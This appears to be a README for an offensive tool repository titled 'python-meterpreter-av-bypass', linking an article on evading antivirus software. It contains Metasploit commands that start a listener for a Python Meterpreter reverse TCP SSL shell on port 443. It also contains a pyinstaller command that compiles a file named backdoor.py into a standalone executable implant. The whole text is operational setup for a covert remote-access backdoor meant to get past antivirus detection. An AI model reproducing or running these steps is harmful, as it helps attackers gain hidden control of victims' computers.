# python-meterpreter-av-bypass
https://medium.com/@R00tendo/bypassing-all-known-anti-virus-applications-python-meterpreter-919255ecd9d1


## Setup metasploit handler

```
use multi/handler
set payload python/meterpreter/reverse_tcp_ssl
set LPORT 443
set LHOST 0.0.0.0
run
```

## Make python implant a binary.

```bash
pyinstaller -F backdoor.py
```
